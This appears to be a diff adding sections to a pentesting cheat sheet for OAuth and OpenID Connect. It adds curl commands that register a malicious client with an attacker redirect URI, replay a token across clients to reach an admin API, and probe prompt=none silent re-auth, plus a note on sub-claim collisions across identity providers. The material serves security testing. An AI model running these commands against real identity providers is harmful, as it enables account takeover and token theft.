@@ -212,6 +212,34 @@ grep -r "intent://\|deeplink\|scheme://" .
 curl https://target.com/.well-known/openid-configuration | python3 -m json.tool
 ```
 
+### OIDC Discovery & Dynamic Registration Abuse
+```bash
+# Enumerate OIDC endpoints (esp. registration_endpoint)
+curl -s https://idp/.well-known/openid-configuration | jq '{authorization_endpoint, token_endpoint, jwks_uri, registration_endpoint, response_types_supported}'
+
+# If registration_endpoint is open, register a malicious client with attacker redirect_uri
+curl -X POST https://idp/connect/register \
+  -H "Content-Type: application/json" \
+  -d '{"client_name":"legit-app","redirect_uris":["https://attacker/cb"]}'
+```
+
+### Cross-Client Token Confusion
+```bash
+# Mint token for client A, attempt replay on client B's API
+TOKEN=$(curl -s https://idp/oauth/token \
+  -d "code=$AUTH_CODE&client_id=CLIENT_A&client_secret=SECRET_A&redirect_uri=https://app-a.com/cb" | jq -r .access_token)
+
+# Test if client B's API accepts the token (no audience validation)
+curl https://api.app-b.com/admin -H "Authorization: Bearer $TOKEN"
+```
+
+### OIDC prompt=none Silent Re-Auth Test
+```bash
+# Test whether adding prompt=none to authorize request yields a token without user interaction
+# Signals session fixation / silent auth abuse potential
+curl -v "https://idp/authorize?client_id=APP&redirect_uri=https://app/cb&response_type=code&state=XYZ&prompt=none"
+```
+
 ---
 
 ## Common Root Causes
@@ -231,6 +259,8 @@ curl https://target.com/.well-known/openid-configuration | python3 -m json.tool
 7. **Misconfigured OAuth application registration** — developers register wildcard redirect URIs (`https://*.example.com/*`) or don't restrict them at all during development and forget to lock down for production.
 
 8. **Client secrets embedded in mobile apps** — treating confidential client credentials as public, enabling an attacker with the secret to perform token requests with arbitrary redirect URIs.
+
+9. **OIDC `sub` claim ambiguity across identity providers** — apps accepting login from multiple IdPs (Google, Microsoft, Apple) may key accounts on `sub` alone without IdP isolation. If two IdPs emit the same `sub` for different users, one IdP's attacker hijacks accounts linked to the other IdP.
 
 ---
 
